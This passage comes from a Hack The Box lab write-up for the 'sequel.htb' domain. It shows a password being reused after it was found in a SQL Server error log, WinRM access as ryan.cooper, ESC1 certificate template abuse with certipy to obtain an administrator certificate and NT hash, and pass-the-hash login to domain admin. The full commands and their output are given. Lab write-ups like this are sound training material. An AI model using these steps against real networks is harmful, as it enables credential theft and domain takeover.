+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt;</code></pre><p>Shell access!</p><p>The only other user on the system with a profile is <code>ryan.cooper</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\SQLServer&gt; dir
+
+
+    Directory: C:\SQLServer
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
+
+
+*Evil-WinRM* PS C:\SQLServer&gt; </code></pre><p>Found the SQL server dir</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\SQLServer\Logs&gt; type ERRORLOG.BAK
+
+2022-11-18 13:43:07.44 Logon       Logon failed for user &#39;sequel.htb\Ryan.Cooper&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
+2022-11-18 13:43:07.48 Logon       Logon failed for user &#39;NuclearMosquito3&#39;. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]</code></pre><p>Looks like ive found a password, ill test if these are valid</p><h2>Compromising <code>ryan.cooper</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc.sequel.htb -u ryan.cooper -p NuclearMosquito3                                            
+LDAP        10.129.7.162    389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb) (signing:Enforced) (channel binding:Never)
+LDAP        10.129.7.162    389    DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3</code></pre><p>Another user compromised</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc winrm dc.sequel.htb -u ryan.cooper -p NuclearMosquito3
+&#39;WINRM       10.129.7.162    5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
+/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.7.162    5985   DC               [+] sequel.htb\ryan.cooper:NuclearMosquito3 (Pwn3d!)</code></pre><p>This user also has access via WINRM</p><h3>Winrm access as <code>ryan.cooper</code></h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.sequel.htb -u ryan.cooper -p NuclearMosquito3
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; dir
+
+
+    Directory: C:\Users\Ryan.Cooper\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        3/21/2026   5:20 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; type user.txt
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop&gt; </code></pre><h2>ADCS</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad find -u ryan.cooper@sequel.htb -p &#39;NuclearMosquito3&#39; -dc-ip 10.129.7.162 -vulnerable -stdout
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;sequel-DC-CA&#39; via RRP
+[*] Successfully retrieved CA configuration for &#39;sequel-DC-CA&#39;
+[*] Checking web enrollment for CA &#39;sequel-DC-CA&#39; @ &#39;dc.sequel.htb&#39;
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[!] Error checking web enrollment: timed out
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : sequel-DC-CA
+    DNS Name                            : dc.sequel.htb
+    Certificate Subject                 : CN=sequel-DC-CA, DC=sequel, DC=htb
+    Certificate Serial Number           : 1EF2FA9A7E6EADAD4F5382F4CE283101
+    Certificate Validity Start          : 2022-11-18 20:58:46+00:00
+    Certificate Validity End            : 2121-11-18 21:08:46+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : SEQUEL.HTB\Administrators
+      Access Rights
+        ManageCa                        : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        ManageCertificates              : SEQUEL.HTB\Administrators
+                                          SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Enroll                          : SEQUEL.HTB\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : UserAuthentication
+    Display Name                        : UserAuthentication
+    Certificate Authorities             : sequel-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 10 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2022-11-18T21:10:22+00:00
+    Template Last Modified              : 2024-01-19T00:26:38+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SEQUEL.HTB\Administrator
+        Full Control Principals         : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Owner Principals          : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Enterprise Admins
+        Write Property Enroll           : SEQUEL.HTB\Domain Admins
+                                          SEQUEL.HTB\Domain Users
+                                          SEQUEL.HTB\Enterprise Admins
+    [+] User Enrollable Principals      : SEQUEL.HTB\Domain Users
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.</code></pre><p>As seen from this output there is a ESC1 vulnerability</p><h3>ESC1</h3><p>First ill start by requesting the administrator account details becuase i will need the admins SID</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad account -u &#39;ryan.cooper&#39; -p &#39;NuclearMosquito3&#39; -dc-ip &#39;10.129.7.162&#39; -user &#39;administrator&#39; read
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for &#39;Administrator&#39;:
+    cn                                  : Administrator
+    distinguishedName                   : CN=Administrator,CN=Users,DC=sequel,DC=htb
+    name                                : Administrator
+    objectSid                           : S-1-5-21-4078382237-1492182817-2568127209-500
+    sAMAccountName                      : Administrator
+    userAccountControl                  : 1114624
+    whenCreated                         : 2022-11-18T17:11:51+00:00
+    whenChanged                         : 2026-03-22T00:19:53+00:00</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">certipy-ad req -u &#39;ryan.cooper@sequel.htb&#39; -p &#39;NuclearMosquito3&#39; -dc-ip &#39;10.129.7.162&#39; -target &#39;dc.sequel.htb&#39; -ca &#39;sequel-DC-CA&#39; -template &#39;UserAuthentication&#39; -upn &#39;administrator@sequel.htb&#39; -sid &#39;S-1-5-21-4078382237-1492182817-2568127209-500&#39;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 14
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;administrator@sequel.htb&#39;
+[*] Certificate object SID is &#39;S-1-5-21-4078382237-1492182817-2568127209-500&#39;
+[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+[*] Wrote certificate and private key to &#39;administrator.pfx&#39;</code></pre><p>This requested the certificate for administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +8h certipy-ad auth -pfx &#39;administrator.pfx&#39; -dc-ip &#39;10.129.7.162&#39;
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;administrator@sequel.htb&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-4078382237-1492182817-2568127209-500&#39;
+[*] Using principal: &#39;administrator@sequel.htb&#39;
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to &#39;administrator.ccache&#39;
+[*] Wrote credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@sequel.htb&#39;: aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee</code></pre><p>So after sinking the time with the DC i can retrieve the NTLM hash of the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i dc.sequel.htb -u administrator -H &#39;a52f78e4c751e5f5e17e1e9f3e58f4ee&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Domain admin and full domain compromise!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-bruno/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Bruno</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-retro/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Retro</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
